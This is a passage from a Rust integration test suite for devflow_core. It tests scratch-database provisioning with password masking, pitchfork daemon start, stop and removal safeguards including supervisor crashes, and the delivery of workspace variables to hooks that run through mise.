    };
    let server = devflow_core::db::Server::for_project(&t.project)
        .unwrap()
        .unwrap();

    // The environment exports one URL per scratch database: the workspace's
    // login and password, another database.
    let mut rec = Recorder::default();
    let a = setup::create(
        &t.project,
        CreateRequest {
            name: "a".into(),
            from: None,
            base: None,
            options: SetupOptions {
                data_from: Some(DataSource::Empty),
                ..Default::default()
            },
        },
        &mut rec,
    )
    .unwrap();
    assert_eq!(a.status, Status::Ready, "{:?}", a.receipt.phases);
    let bound = binding(&a.receipt);
    let id = bound.branch_id.expect("a server-backed binding");
    let env = env_map(&a.workspace);
    let params = devflow_core::conn::Params::parse(&bound.url).unwrap();
    let password = params.password().unwrap().to_string();
    assert_eq!(
        bound.extras.keys().collect::<Vec<_>>(),
        ["shadow", "test"],
        "the receipt lists names and databases"
    );
    for (name, var) in [
        ("test", "TEST_DATABASE_URL"),
        ("shadow", "SHADOW_DATABASE_URL"),
    ] {
        let extra = &bound.extras[name];
        assert_eq!(env[var], bound.extra_url(name).unwrap());
        let scratch = devflow_core::conn::Params::parse(&env[var]).unwrap();
        assert_eq!(scratch.get("dbname"), Some(extra.database.as_str()));
        assert_ne!(extra.database, bound.database);
        assert_eq!(scratch.get("user"), Some(bound.role.as_str()));
        assert_eq!(scratch.password(), Some(password.as_str()));
        assert_eq!(
            connect(&env[var])
                .query_one("SELECT 1", &[])
                .unwrap()
                .get::<_, i32>(0),
            1
        );
    }
    let on_server = server.branch(id).unwrap().unwrap();
    assert_eq!(
        on_server
            .extras
            .iter()
            .map(|e| (e.name.as_str(), e.db_name.as_str()))
            .collect::<Vec<_>>(),
        [
            ("test", bound.extras["test"].database.as_str()),
            ("shadow", bound.extras["shadow"].database.as_str())
        ]
    );
    // No second copy of the password in the receipt, and the shown forms mask it.
    let listed = serde_json::to_string(&bound.extras).unwrap();
    assert!(!listed.contains(&password), "{listed}");
    for var in ["DATABASE_URL", "TEST_DATABASE_URL", "SHADOW_DATABASE_URL"] {
        assert!(
            !devflow_core::redact::text(&env[var]).contains(&password),
            "{var}"
        );
    }
    // Hooks see the variable, and their output is masked.
    assert_eq!(
        std::fs::read_to_string(a.workspace.path.join(".devflow/shadow-url"))
            .unwrap()
            .trim(),
        env["SHADOW_DATABASE_URL"]
    );
    let seen: Vec<_> = rec
        .lines
        .iter()
        .filter(|l| l.starts_with("hook sees"))
        .collect();
    assert_eq!(seen.len(), 1, "{:?}", rec.lines);
    assert!(!seen[0].contains(&password), "{}", seen[0]);

    // A clone gets its own, empty ones.
    connect(&env["TEST_DATABASE_URL"])
        .batch_execute("CREATE TABLE t (i int)")
        .unwrap();
    connect(&bound.url)
        .batch_execute("CREATE TABLE own (i int)")
        .unwrap();
    let b = create(
        &t.project,
        "b",
        SetupOptions {
            data_from: Some(DataSource::Workspace { name: "a".into() }),
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(b.status, Status::Ready, "{:?}", b.receipt.phases);
    let env_b = env_map(&b.workspace);
    assert_eq!(
        tables(&env_b["DATABASE_URL"]),
        1,
        "the branch's own data is cloned"
    );
    assert_eq!(tables(&env_b["TEST_DATABASE_URL"]), 0);
    assert_eq!(tables(&env_b["SHADOW_DATABASE_URL"]), 0);
    assert_ne!(env_b["TEST_DATABASE_URL"], env["TEST_DATABASE_URL"]);
    assert_eq!(tables(&env["TEST_DATABASE_URL"]), 1, "a keeps its own");

    // A reset empties them again, under the same URLs.
    setup::reset_data(&t.project, &a.workspace, Some(DataSource::Empty)).unwrap();
    assert_eq!(tables(&env["DATABASE_URL"]), 0);
    assert_eq!(tables(&env["TEST_DATABASE_URL"]), 0);
    assert_eq!(
        env_map(&a.workspace)["TEST_DATABASE_URL"],
        env["TEST_DATABASE_URL"]
    );

    // A name added later: the workspace needs attention until setup provisions
    // it, on the branch it already has, without touching the others.
    connect(&env["TEST_DATABASE_URL"])
        .batch_execute("CREATE TABLE keep (i int)")
        .unwrap();
    let project = edit_config(&t, |text| {
        text.replace(
            "extra_databases = [\"test\", \"shadow\"]",
            "extra_databases = [\"test\", \"shadow\", \"e2e\"]",
        )
    });
    let listed = setup::list(&project).unwrap();
    let w = listed.iter().find(|w| w.workspace.name == "a").unwrap();
    assert_eq!(w.status, Some(Status::NeedsAttention));
    assert!(
        w.receipt
            .as_ref()
            .unwrap()
            .phase(Phase::Services)
            .detail
            .unwrap()
            .contains("'db' changed")
    );
    let done = setup::setup(
        &project,
        &a.workspace,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(done.status, Status::Ready, "{:?}", done.receipt.phases);
    let env = env_map(&a.workspace);
    assert_eq!(
        binding(&done.receipt).branch_id,
        Some(id),
        "the same branch"
    );
    assert_eq!(tables(&env["E2E_DATABASE_URL"]), 0);
    assert_eq!(
        tables(&env["TEST_DATABASE_URL"]),
        1,
        "existing scratch databases are not emptied by a setup"
    );
    // (A server handle carries the configuration it was made under.)
    let server = devflow_core::db::Server::for_project(&project)
        .unwrap()
        .unwrap();
    assert_eq!(server.reconcile().unwrap().orphans.len(), 0);

    // A name removed: no longer exported, still on the server as an orphan.
    let shadow_db = binding(&done.receipt).extras["shadow"].database.clone();
    let project = edit_config(&t, |text| {
        text.replace(
            "extra_databases = [\"test\", \"shadow\", \"e2e\"]",
            "extra_databases = [\"test\", \"e2e\"]",
        )
    });
    let done = setup::setup(
        &project,
        &a.workspace,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(done.status, Status::Ready, "{:?}", done.receipt.phases);
    let env = env_map(&a.workspace);
    assert!(!env.contains_key("SHADOW_DATABASE_URL"));
    assert!(!binding(&done.receipt).extras.contains_key("shadow"));
    let server = devflow_core::db::Server::for_project(&project)
        .unwrap()
        .unwrap();
    let orphans = server.reconcile().unwrap().orphans;
    assert!(
        orphans.len() == 2 && orphans.iter().any(|o| o.contains(&shadow_db)),
        "a's and b's: {orphans:?}"
    );

    // Removing a workspace drops its scratch databases with its branch;
    // `--keep-data` keeps all of it.
    let b_extras: Vec<String> = binding(&b.receipt)
        .extras
        .values()
        .map(|e| e.database.clone())
        .collect();
    let gone = setup::remove(&project, "b", RemoveOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(gone.dropped_branch, binding(&b.receipt).branch_id);
    assert_eq!(b_extras.len(), 2);
    assert!(
        postgres::Client::connect(&env_b["TEST_DATABASE_URL"], postgres::NoTls).is_err(),
        "b's scratch databases went with its branch"
    );
    let a_test = env["TEST_DATABASE_URL"].clone();
    let kept = setup::remove(
        &project,
        "a",
        RemoveOptions {
            keep_data: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(kept.dropped_branch, None);
    assert_eq!(tables(&a_test), 1, "kept with the data");
    assert!(server.branch(id).unwrap().is_some());
    server.down().unwrap();
}

/// The pitchfork tests share one isolated supervisor, which each of them stops
/// when it ends: they run one at a time.
static PITCHFORK_TESTS: std::sync::Mutex<()> = std::sync::Mutex::new(());

#[test]
#[ignore = "needs pitchfork on PATH"]
fn pitchfork_lists_starts_and_stops_a_daemon() {
    use devflow_core::pitchfork::Pitchfork;
    use std::time::Duration;
    let _one_at_a_time = PITCHFORK_TESTS.lock().unwrap_or_else(|e| e.into_inner());
    let base = init();
    let pitchfork = Pitchfork::locate().expect(
        "pitchfork is not on PATH; try `mise x pitchfork@2.29.0 -- cargo test -p devflow-core --test workspace -- --ignored pitchfork`",
    );
    let detection = pitchfork.detect();
    assert!(detection.usable(), "{}", detection.summary());
    let binary = pitchfork.path().to_path_buf();
    let _cleanup = Cleanup(Box::new(move || {
        let _ = std::process::Command::new(&binary)
            .args(["supervisor", "stop"])
            .output();
    }));
    let dir = base.join("pf-project");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(
        dir.join("pitchfork.toml"),
        "[daemons.sleeper]\nrun = \"sleep 600\"\n",
    )
    .unwrap();
    // The namespace file devflow writes: the daemon's id carries it.
    std::fs::write(
        dir.join("pitchfork.local.toml"),
        "namespace = \"df-00000000-00000001\"\nworktree_label = \"pf-project\"\n",
    )
    .unwrap();
    let mine = |pitchfork: &Pitchfork, dir: &Path| {
        pitchfork
            .list(dir)
            .unwrap()
            .into_iter()
            .filter(|d| d.namespace == "df-00000000-00000001")
            .collect::<Vec<_>>()
    };

    // Asking never starts a supervisor; a start does.
    assert!(!pitchfork.supervisor_up(&dir).unwrap_or(false));
    let sleeper = vec!["df-00000000-00000001/sleeper".to_string()];
    let ran = pitchfork
        .start(&dir, &sleeper, Duration::from_secs(60))
        .unwrap();
    assert!(ran.ok, "{ran:?}");
    assert!(pitchfork.supervisor_up(&dir).unwrap());
    let found = mine(&pitchfork, &dir);
    assert_eq!(found.len(), 1, "{found:?}");
    assert_eq!(found[0].id, "df-00000000-00000001/sleeper");
    assert_eq!(found[0].status, "running");
    assert!(found[0].pid.is_some());
    // The proxy is off by default; the query works either way.
    assert!(!pitchfork.proxy_status(&dir).unwrap().enabled);

    let ran = pitchfork
        .stop(&dir, &sleeper, Duration::from_secs(60))
        .unwrap();
    assert!(ran.ok, "{ran:?}");
    let found = mine(&pitchfork, &dir);
    assert!(found.iter().all(|d| d.status != "running"), "{found:?}");
    // Option-like and unqualified ids never reach pitchfork.
    for bad in ["--all", "--local", "sleeper", ""] {
        assert!(
            pitchfork
                .start(&dir, &[bad.to_string()], Duration::from_secs(5))
                .is_err(),
            "{bad:?}"
        );
    }
    assert!(pitchfork.start(&dir, &[], Duration::from_secs(5)).is_err());
}

#[test]
#[ignore = "needs pitchfork on PATH"]
fn pitchfork_start_and_stop_by_id_never_reach_a_parents_daemons() {
    use devflow_core::pitchfork::Pitchfork;
    use std::time::Duration;
    let _one_at_a_time = PITCHFORK_TESTS.lock().unwrap_or_else(|e| e.into_inner());
    let base = init();
    let pitchfork = Pitchfork::locate().expect(
        "pitchfork is not on PATH; try `mise x pitchfork@2.29.0 -- cargo test -p devflow-core --test workspace -- --ignored pitchfork`",
    );
    let detection = pitchfork.detect();
    assert!(detection.usable(), "{}", detection.summary());
    let binary = pitchfork.path().to_path_buf();
    let _cleanup = Cleanup(Box::new(move || {
        let _ = std::process::Command::new(&binary)
            .args(["supervisor", "stop"])
            .output();
    }));
    // `parent/` and `parent/child/` each have a configuration, as a worktree
    // inside another project does. pitchfork's `--local` from `child` selects
    // both projects' daemons; ids select exactly the ones named.
    let parent = base.join("pf-parent");
    let child = parent.join("pf-child");
    std::fs::create_dir_all(&child).unwrap();
    std::fs::write(
        parent.join("pitchfork.toml"),
        "namespace = \"pf-ns-parent\"\n[daemons.elder]\nrun = \"sleep 600\"\n",
    )
    .unwrap();
    std::fs::write(
        child.join("pitchfork.toml"),
        "namespace = \"pf-ns-child\"\n[daemons.younger]\nrun = \"sleep 601\"\n\
         [daemons.worker]\nrun = \"sleep 602\"\ndepends = [\"younger\"]\n",
    )
    .unwrap();
    let running = |pitchfork: &Pitchfork| {
        let mut ids: Vec<String> = pitchfork
            .list(&child)
            .unwrap()
            .into_iter()
            .filter(|d| d.status == "running")
            .map(|d| d.id)
            .collect();
        ids.sort();
        ids
    };
    let timeout = Duration::from_secs(60);

    // A dependency inside the namespace comes with the daemon asked for.
    let ran = pitchfork
        .start(&child, &["pf-ns-child/worker".to_string()], timeout)
        .unwrap();
    assert!(ran.ok, "{ran:?}");
    assert_eq!(
        running(&pitchfork),
        ["pf-ns-child/worker", "pf-ns-child/younger"],
        "the parent project's daemon was not started"
    );
    // Stopping one daemon by id leaves the other, and the parent's.
    let ran = pitchfork
        .start(&child, &["pf-ns-parent/elder".to_string()], timeout)
        .unwrap();
    assert!(ran.ok, "{ran:?}");
    let ran = pitchfork
        .stop(&child, &["pf-ns-child/worker".to_string()], timeout)
        .unwrap();
    assert!(ran.ok, "{ran:?}");
    assert_eq!(
        running(&pitchfork),
        ["pf-ns-child/younger", "pf-ns-parent/elder"]
    );
    let ran = pitchfork
        .stop(&child, &["pf-ns-child/younger".to_string()], timeout)
        .unwrap();
    assert!(ran.ok, "{ran:?}");
    assert_eq!(running(&pitchfork), ["pf-ns-parent/elder"]);
    let ran = pitchfork
        .stop(&child, &["pf-ns-parent/elder".to_string()], timeout)
        .unwrap();
    assert!(ran.ok, "{ran:?}");
    assert!(running(&pitchfork).is_empty());
}

/// Whether process `pid` is alive (`kill -0`).
fn process_alive(pid: u32) -> bool {
    std::process::Command::new("kill")
        .args(["-0", &pid.to_string()])
        .stderr(std::process::Stdio::null())
        .status()
        .is_ok_and(|status| status.success())
}

#[test]
#[ignore = "needs pitchfork on PATH"]
fn removing_a_workspace_whose_checkout_is_gone_never_stops_its_daemon_for_it() {
    // The reproduction against a real pitchfork: autostart a daemon, delete
    // the worktree, remove the workspace. It used to say "Removed" while the
    // daemon (and its port) lived on and the receipt that named it was gone.
    // Stopping it is not on offer: pitchfork 2.29/2.30 has no stop that skips
    // the lifecycle hooks the supervisor runs from the daemon's recorded
    // directory, so the removal is refused (`state_unknown`), and a forced one
    // leaves it running and lists it.
    use devflow_core::pitchfork::Pitchfork;
    use devflow_core::processes::{self, StartOptions};
    use std::sync::{Arc, Mutex};
    let _one_at_a_time = PITCHFORK_TESTS.lock().unwrap_or_else(|e| e.into_inner());
    let base = init();
    let pitchfork = Pitchfork::locate().expect(
        "pitchfork is not on PATH; try `mise x pitchfork@2.29.0 -- cargo test -p devflow-core --test workspace -- --ignored pitchfork`",
    );
    let detection = pitchfork.detect();
    assert!(detection.usable(), "{}", detection.summary());
    // Only ever the isolated supervisor `init` set up, never the user's own.
    let state_dir = PathBuf::from(std::env::var_os("PITCHFORK_STATE_DIR").expect("isolated state"));
    assert!(state_dir.starts_with(base), "{}", state_dir.display());

    let strays: Arc<Mutex<Vec<u32>>> = Arc::default();
    let binary = pitchfork.path().to_path_buf();
    let for_cleanup = strays.clone();
    let _cleanup = Cleanup(Box::new(move || {
        for pid in for_cleanup.lock().unwrap().iter() {
            let _ = std::process::Command::new("kill")
                .args(["-9", &pid.to_string()])
                .stderr(std::process::Stdio::null())
                .status();
        }
        let _ = std::process::Command::new(&binary)
            .args(["supervisor", "stop"])
            .output();
    }));

    let t = repo(&Hooks::default(), "");
    std::fs::write(
        t.root.join("pitchfork.toml"),
        "[daemons.sleeper]\nrun = \"sleep 604\"\n",
    )
    .unwrap();
    commit_all(
        &git2::Repository::open(&t.root).unwrap(),
        "add a pitchfork daemon",
    );
    let project = Project::open(&t.root).unwrap();
    let made = create(&project, "gone", SetupOptions::default()).unwrap();
    assert_eq!(made.status, Status::Ready, "{:?}", made.receipt.phases);
    let workspace = made.workspace;
    let scope = trust::scope_at(&project, &workspace.path);
    trust::approve_scope_at(&project, &workspace.path, &scope).unwrap();
    let report = processes::start_with(
        Some(&pitchfork),
        &project,
        &workspace,
        &StartOptions::default(),
    )
    .unwrap();
    assert!(report.ok(), "{report:?}");
    let ns = receipt_of(&workspace).slug();
    let listed = pitchfork.list(&workspace.path).unwrap();
    let sleeper = listed
        .iter()
        .find(|d| d.namespace == ns && d.name == "sleeper")
        .unwrap_or_else(|| panic!("{listed:?}"));
    let pid = sleeper.pid.expect("a running daemon has a pid");
    strays.lock().unwrap().push(pid);
    assert!(process_alive(pid));

    // The worktree is deleted from under devflow.
    std::fs::remove_dir_all(&workspace.path).unwrap();
    assert!(ws(&project, "gone").missing);
    let removal = |force: bool| RemoveOptions {
        force,
        pitchfork: Some(pitchfork.clone()),
        ..RemoveOptions::default()
    };
    let error = setup::remove(&project, "gone", removal(false), &mut NoProgress).unwrap_err();
    let refused = protection(&error);
    assert!(refused.forceable, "{}", refused.reason);
    assert!(
        refused.reason.contains(&format!("{ns}/sleeper")),
        "{}",
        refused.reason
    );
    // Nothing happened: registered, the receipt records the start, the daemon runs.
    assert!(ws(&project, "gone").missing);
    assert!(process_alive(pid));

    let out = setup::remove(&project, "gone", removal(true), &mut NoProgress).unwrap();
    assert!(out.stopped_daemons.is_empty(), "{out:?}");
    assert_eq!(
        out.may_still_run,
        Some(devflow_core::processes::MayStillRun {
            namespace: Some(ns.clone()),
            ids: vec![format!("{ns}/sleeper")],
        })
    );
    assert!(
        process_alive(pid),
        "a forced removal does not stop it either"
    );
    assert!(worktree::find(&project, "gone").unwrap().is_none());
}

#[test]
#[ignore = "needs pitchfork on PATH"]
fn a_crashed_pitchfork_supervisor_does_not_authorize_removal_while_its_daemon_lives() {
    use devflow_core::pitchfork::Pitchfork;
    use devflow_core::processes::{self, Refusal, StartOptions, StopOptions};
    use std::sync::{Arc, Mutex};
    use std::time::{Duration, Instant};
    let _one_at_a_time = PITCHFORK_TESTS.lock().unwrap_or_else(|e| e.into_inner());
    let base = init();
    let pitchfork = Pitchfork::locate().expect(
        "pitchfork is not on PATH; try `mise x pitchfork@2.29.0 -- cargo test -p devflow-core --test workspace -- --ignored pitchfork`",
    );
    let detection = pitchfork.detect();
    assert!(detection.usable(), "{}", detection.summary());
    // Everything below happens in the isolated state `init` set up: this test
    // kills a supervisor, and it must only ever be its own.
    let state_dir = PathBuf::from(std::env::var_os("PITCHFORK_STATE_DIR").expect("isolated state"));
    assert!(state_dir.starts_with(base), "{}", state_dir.display());

    // The daemons this test starts are ended even when it fails.
    let strays: Arc<Mutex<Vec<u32>>> = Arc::default();
    let binary = pitchfork.path().to_path_buf();
    let for_cleanup = strays.clone();
    let _cleanup = Cleanup(Box::new(move || {
        for pid in for_cleanup.lock().unwrap().iter() {
            let _ = std::process::Command::new("kill")
                .args(["-9", &pid.to_string()])
                .stderr(std::process::Stdio::null())
                .status();
        }
        let _ = std::process::Command::new(&binary)
            .args(["supervisor", "stop"])
            .output();
    }));

    let t = repo(&Hooks::default(), "");
    std::fs::write(
        t.root.join("pitchfork.toml"),
        "[daemons.sleeper]\nrun = \"sleep 603\"\n",
    )
    .unwrap();
    commit_all(
        &git2::Repository::open(&t.root).unwrap(),
        "add a pitchfork daemon",
    );
    let project = Project::open(&t.root).unwrap();

    // A ready workspace with approved pitchfork files and its daemon started
    // through devflow, so the receipt records the start.
    let started = |name: &str| -> (Workspace, u32) {
        let made = create(&project, name, SetupOptions::default()).unwrap();
        assert_eq!(made.status, Status::Ready, "{:?}", made.receipt.phases);
        let workspace = made.workspace;
        let scope = trust::scope_at(&project, &workspace.path);
        trust::approve_scope_at(&project, &workspace.path, &scope).unwrap();
        let report = processes::start_with(
            Some(&pitchfork),
            &project,
            &workspace,
            &StartOptions::default(),
        )
        .unwrap();
        assert!(report.ok(), "{report:?}");
        let ns = receipt_of(&workspace).slug();
        let listed = pitchfork.list(&workspace.path).unwrap();
        let sleeper = listed
            .iter()
            .find(|d| d.namespace == ns && d.name == "sleeper")
            .unwrap_or_else(|| panic!("{listed:?}"));
        assert_eq!(sleeper.status, "running", "{sleeper:?}");
        let pid = sleeper.pid.expect("a running daemon has a pid");
        strays.lock().unwrap().push(pid);
        assert!(process_alive(pid));
        assert!(
            receipt_of(&workspace)
                .processes
                .is_some_and(|record| record.ids == [format!("{ns}/sleeper")]),
            "the start was recorded"
        );
        (workspace, pid)
    };
    // SIGKILL of the isolated supervisor alone (its pid is in the isolated
    // state file), then wait until pitchfork says it is down.
    let kill_supervisor = |workspace: &Workspace| {
        let state: toml::Table =
            toml::from_str(&std::fs::read_to_string(state_dir.join("state.toml")).unwrap())
                .unwrap();
        let pid = state["daemons"]["global/pitchfork"]["pid"]
            .as_integer()
            .expect("the supervisor's pid") as u32;
        assert!(process_alive(pid), "the supervisor of this test runs");
        assert!(
            std::process::Command::new("kill")
                .args(["-9", &pid.to_string()])
                .status()
                .unwrap()
                .success()
        );
        let deadline = Instant::now() + Duration::from_secs(10);
        while pitchfork.supervisor_up(&workspace.path).unwrap_or(false) {
            assert!(Instant::now() < deadline, "the supervisor did not go down");
            std::thread::sleep(Duration::from_millis(50));
        }
    };
    let removal = |force: bool| RemoveOptions {
        force,
        pitchfork: Some(pitchfork.clone()),
        ..RemoveOptions::default()
    };

    // 1. A crashed supervisor, daemon alive: removal without --force is
    //    refused, with --force it goes on and says the daemon may still run.
    let (a, daemon) = started("a");
    kill_supervisor(&a);
    assert!(process_alive(daemon), "the daemon survives its supervisor");
    let error = setup::remove(&project, "a", removal(false), &mut NoProgress).unwrap_err();
    let refused = protection(&error);
    assert!(refused.forceable, "{}", refused.reason);
    assert!(
        refused.reason.contains("supervisor is down"),
        "{}",
        refused.reason
    );
    assert!(a.path.exists(), "the workspace was not deleted");
    assert!(process_alive(daemon));
    let out = setup::remove(&project, "a", removal(true), &mut NoProgress).unwrap();
    assert!(!a.path.exists());
    assert!(
        out.warnings.iter().any(|w| w.contains("supervisor is down")
            && w.contains("may still be running and were not stopped")),
        "{:?}",
        out.warnings
    );
    assert!(
        process_alive(daemon),
        "a forced removal does not end it either"
    );

    // 2. The way out the refusal names: start the supervisor (it takes the
    //    surviving daemon back), then stop through devflow; the removal after
    //    that is clean.
    let (b, daemon) = started("b");
    kill_supervisor(&b);
    assert!(process_alive(daemon));
    let refusal =
        processes::stop_with(Some(&pitchfork), &project, &b, &StopOptions::default()).unwrap_err();
    assert!(
        matches!(
            refusal.downcast_ref::<Refusal>(),
            Some(Refusal::StateUnknown { .. })
        ),
        "{refusal:#}"
    );
    assert!(
        std::process::Command::new(pitchfork.path())
            .args(["supervisor", "start"])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .unwrap()
            .success()
    );
    let report =
        processes::stop_with(Some(&pitchfork), &project, &b, &StopOptions::default()).unwrap();
    assert!(report.ok(), "{report:?}");
    let deadline = Instant::now() + Duration::from_secs(10);
    while process_alive(daemon) {
        assert!(Instant::now() < deadline, "the daemon was not stopped");
        std::thread::sleep(Duration::from_millis(50));
    }
    assert!(
        receipt_of(&b).processes.is_none(),
        "a verified stop clears it"
    );
    let out = setup::remove(&project, "b", removal(false), &mut NoProgress).unwrap();
    assert!(!b.path.exists());
    assert!(
        !out.warnings
            .iter()
            .any(|w| w.contains("supervisor is down")),
        "{:?}",
        out.warnings
    );
}

#[allow(dead_code)]
fn _config_is_used(_: &Config) {}

#[test]
fn a_receiptless_worktree_recreated_in_place_is_never_removed_from_a_stale_view() {
    let t = repo(&Hooks::default(), "");
    // A checkout devflow never set up (no receipt), as shown in a list.
    let shown = worktree::create(&t.project, "plain", None).unwrap();
    let listed = worktree::find(&t.project, "plain").unwrap().unwrap();
    assert!(listed.fingerprint.is_some());
    let view = expecting(&listed, None);

    // Outside devflow: removed and recreated at the same path and branch,
    // then given work that must not be lost.
    worktree::remove(&t.project, &listed).unwrap();
    let again = worktree::create(&t.project, "plain", None).unwrap();
    assert_eq!(again.path, shown.path);
    std::fs::write(again.path.join("precious.txt"), "keep me").unwrap();

    for force in [false, true] {
        let error = setup::remove(
            &t.project,
            "plain",
            RemoveOptions {
                force,
                expect: Some(view.clone()),
                ..Default::default()
            },
            &mut NoProgress,
        )
        .unwrap_err();
        assert!(!protection(&error).forceable, "{error:#}");
        assert!(error.to_string().contains("replaced"), "{error:#}");
        assert!(again.path.join("precious.txt").exists());
    }
}

// -- mise delivery, checked before the first setup hook ----------------------------------
//
// A hook that goes through mise has mise's `[env]` applied over the variables
// devflow gives it. The gate asks mise what the hook's process would see, with
// the environment the hook gets, for the hooks whose command runs mise; a hook
// that runs `devflow exec` inside mise needs no check. These tests run a real
// mise with state of its own.

/// Whether a real `mise` runs here; the tests that need one skip otherwise.
fn mise_installed() -> bool {
    std::process::Command::new("mise")
        .arg("--version")
        .output()
        .is_ok_and(|output| output.status.success())
}

/// The environment of a child test process that has mise state of its own:
/// everything below `base` (temporary directories included, so the only path
/// mise trusts is the one the repository lives under), and the stand-in
/// `devflow` first on PATH.
fn isolated_mise(base: &Path) -> Vec<(String, String)> {
    let path = |relative: &str| base.join(relative).display().to_string();
    let bin = base.join("bin");
    std::fs::create_dir_all(&bin).unwrap();
    // `devflow exec -- CMD` as the CLI does it: the workspace's variables from
    // `.devflow/env` on top of the environment, then CMD. (The real binary is
    // tested in the CLI's own tests; core cannot build it.)
    let devflow = bin.join("devflow");
    std::fs::write(
        &devflow,
        "#!/bin/sh\n[ \"$1\" = exec ] || exit 64\nshift\n[ \"$1\" = -- ] && shift\nset -a\n. \"$DEVFLOW_WORKSPACE_PATH/.devflow/env\"\nset +a\nexec \"$@\"\n",
    )
    .unwrap();
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&devflow, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    let original = std::env::var("PATH").unwrap_or_default();
    vec![
        ("TMPDIR".into(), path("tmp")),
        ("PATH".into(), format!("{}:{original}", bin.display())),
        ("HOME".into(), path("mise-state/home")),
        ("MISE_DATA_DIR".into(), path("mise-state/data")),
        ("MISE_CONFIG_DIR".into(), path("mise-state/config")),
        ("MISE_CACHE_DIR".into(), path("mise-state/cache")),
        ("MISE_STATE_DIR".into(), path("mise-state/state")),
        (
            "MISE_GLOBAL_CONFIG_FILE".into(),
            path("mise-state/config/config.toml"),
        ),
        (
            "MISE_SYSTEM_CONFIG_DIR".into(),
            path("mise-state/system-config"),
        ),
        (
            "MISE_SYSTEM_DATA_DIR".into(),
            path("mise-state/system-data"),
        ),
        (
            "MISE_TRUSTED_CONFIG_PATHS".into(),
            base.display().to_string(),
        ),
    ]
}

/// The start of a test that needs a real, isolated mise: `true` where the
/// body should run (the child process, started with that environment), and
/// `false` in the parent (which ran the child and checked it) or where mise
/// is missing.
fn with_real_mise(test: &str) -> bool {
    if std::env::var_os(CHILD).is_none() && !mise_installed() {
        eprintln!("skipped: mise is not installed");
        return false;
    }
    let base = tempfile::tempdir().unwrap();
    let base_path = base.path().canonicalize().unwrap();
    std::fs::create_dir_all(base_path.join("tmp")).unwrap();
    let env = isolated_mise(&base_path);
    let env: Vec<(&str, &str)> = env.iter().map(|(k, v)| (k.as_str(), v.as_str())).collect();
    in_child(test, &env)
}

/// Write `files` in the main checkout and commit them.
fn commit_files(t: &Repo, files: &[(&str, &str)]) {
    for (name, text) in files {
        let path = t.root.join(name);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }
    commit_all(&git2::Repository::open(&t.root).unwrap(), "mise");
}

/// Commit `mise.toml` (and `files`) in the main checkout.
fn commit_mise(t: &Repo, mise: &str, files: &[(&str, &str)]) {
    let mut all = vec![("mise.toml", mise)];
    all.extend_from_slice(files);
    commit_files(t, &all);
}

fn no_db(project: &Project) -> SetupOptions {
    SetupOptions {
        no_db: true,
        ..trusted(project)
    }
}

/// What the hook below writes: the `COMPOSE_PROJECT_NAME` it was given.
const SEEN: &str =
    "printf %s \"$COMPOSE_PROJECT_NAME\" > \"$DEVFLOW_WORKSPACE_PATH/.devflow/seen\"\n";
const MAIN: &str = "main-checkout";

/// A project whose only setup hook is `hook` (and `extra` appended to
/// `devflow.toml`), with the main checkout's own `COMPOSE_PROJECT_NAME` in a
/// `.env` that mise can load, and `seen.sh` committed next to `files`.
fn project_with_hook(hook: &str, extra: &str, files: &[(&str, &str)]) -> Repo {
    let t = repo(
        &Hooks {
            setup: &[hook],
            ..Default::default()
        },
        extra,
    );
    std::fs::write(
        t.root.join(".env"),
        format!("COMPOSE_PROJECT_NAME={MAIN}\n"),
    )
    .unwrap();
    trust::approve(&t.project).unwrap();
    let mut all = files.to_vec();
    all.push(("seen.sh", SEEN));
    commit_files(&t, &all);
    t
}

fn seen(w: &Workspace) -> Option<String> {
    std::fs::read_to_string(w.path.join(".devflow/seen")).ok()
}

fn hooks_record(out: &SetupOutcome) -> devflow_core::receipt::PhaseRecord {
    out.receipt.phase(Phase::Hooks)
}

const WIRED: &str = "[env]\n_.file = \".devflow/env\"\n";
const THROUGH_MISE: &str = "mise exec -- sh seen.sh";
const ROUTED: &str = "mise exec -- devflow exec -- sh seen.sh";

#[test]
fn hooks_wait_for_a_mise_that_hands_them_the_workspaces_variables() {
    // The reviewers' reproductions, against a real mise: mise's `[env]` is
    // applied over the variables devflow gives a command that goes through
    // mise, so a `.env` it loads after `.devflow/env` would hand a
    // postinstall script the main checkout's database.
    const NAME: &str = "hooks_wait_for_a_mise_that_hands_them_the_workspaces_variables";
    if !with_real_mise(NAME) {
        return;
    }
    let t = project_with_hook(THROUGH_MISE, "", &[]);
    let wired = WIRED;

    // Delivered: the hook runs, nothing is recorded.
    commit_mise(&t, wired, &[]);
    let ok = create(&t.project, "ok", no_db(&t.project)).unwrap();
    assert_eq!(ok.status, Status::Ready, "{:?}", ok.receipt.phases);
    assert_eq!(
        seen(&ok.workspace).as_deref(),
        env_map(&ok.workspace)
            .get("COMPOSE_PROJECT_NAME")
            .map(String::as_str)
    );
    assert!(ok.receipt.mise_check_skipped_at.is_none());
    assert!(ok.warnings.iter().all(|w| !w.contains("devflow exec")));

    // Reproduction 1: a repeated entry after `.devflow/env` wins.
    // Reproduction 2: `mise.local.toml` over the base wiring wins.
    // Reproduction 3: mise loads `.env` and not `.devflow/env` at all.
    for (name, mise, extra) in [
        (
            "dup",
            "[env]\n_.file = [\".env\", \".devflow/env\", \".env\"]\n",
            vec![],
        ),
        (
            "local",
            wired,
            vec![("mise.local.toml", "[env]\n_.file = \".env\"\n")],
        ),
        ("other", "[env]\n_.file = \".env\"\n", vec![]),
    ] {
        let _ = std::fs::remove_file(t.root.join("mise.local.toml"));
        commit_mise(&t, mise, &extra);
        let out = create(&t.project, name, no_db(&t.project)).unwrap();
        let hooks = hooks_record(&out);
        assert_eq!(out.status, Status::NeedsAttention, "{name}");
        assert!(
            hooks.state == PhaseState::Skipped && hooks.required_skip,
            "{name}: {hooks:?}"
        );
        let detail = hooks.detail.unwrap();
        assert!(
            detail.contains(
